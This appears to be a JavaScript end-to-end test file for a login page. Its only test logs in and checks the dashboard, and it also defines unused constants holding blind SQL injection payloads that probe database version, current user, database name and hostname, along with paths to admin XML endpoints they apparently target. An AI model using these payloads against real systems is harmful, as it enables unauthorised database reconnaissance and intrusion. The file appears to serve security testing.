
import { LoginActions } from "../../pages/loginAction";
import { HomeActions } from "../../pages/homeAction";
import user from "../../support/constants"


describe("Test Login Function", () => {
  const loginActions = new LoginActions();
  const homeActions = new HomeActions();
  const request5 = `o%25'%20AND%20MID(VERSION(),1,1)%20LIKE%20'5'%
  20AND%20'xVuq%25'%3D'xVuq&email=&username=29`
  const request4 = `o%25'%20AND%20MID(VERSION(),1,1)%20LIKE%20'4'%
  20AND%20'xVuq%25'%3D'xVuq&email=&username=29`
  const requestMariaDB = `o%25'%20AND%20MID(VERSION(),1,14)%20LIKE%20'5.
  5.68-MariaDB'%20AND%20'xVuq%25'%3D'xVuq&email=&username=29`
  const requestMariaDBFalse = `o%' AND MID(VERSION(),1,1) LIKE '4' AND 'xVuq%'='xVuq (false)`
  const requestMariaDBTrue = `o%' AND MID(VERSION(),1,1) LIKE '4' AND 'xVuq%'='xVuq (true)`
  const requestMariaDBHostName = `o%' AND (ORD(MID((IFNULL(CAST(@@HOSTNAME AS NCHAR),0x20)),2,1))>96)*1058 AND 'ZQMZ%'='ZQMZ`

  const listParameters1 = ['/admins/getusersxml?usertype=m&fname=k&lname=',
 '/admins/laboratoryxml?name=&code=' 
  ]
  const listParameters2 = [
  `o%' AND (ORD(MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),10,1))>104)*6002 AND 'sHHN%'='sHHN`,
  `o%' AND (ORD(MID((IFNULL(CAST(VERSION() AS NCHAR),0x20)),15,1))>64)*2318 AND 'xVuq%'='xVuq`,
  `o%' AND (ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),3,1))>104)*9442 AND 'JvgE%'='JvgE`,
  `o%' AND (ORD(MID((IFNULL(CAST(@@HOSTNAME AS NCHAR),0x20)),2,1))>96)*1058 AND 'ZQMZ%'='ZQMZ`,]
  const listParameters2Unencoded = [
  `o%' AND MID(VERSION(),1,1) LIKE '5' AND 'xVuq%'='xVuq (true)`,
  `o%' AND MID(VERSION(),1,1) LIKE '4' AND 'xVuq%'='xVuq (false)`,
  `o%' AND MID(VERSION(),1,14) LIKE '5.5.68-MariaDB' AND 'xVuq%'='xVuq (true)`,
  `o%' AND MID(VERSION(),1,14) LIKE '5.5.68-MariaDK' AND 'xVuq%'='xVuq (false)`]
  it("User should login successful", () => {
    loginActions.visitPage();
    loginActions.inputUserName(user.username);
    loginActions.inputPassword(user.password);
    loginActions.clickLoginButton();
    homeActions.isDashBoardButtonDisplayed();
  });

});
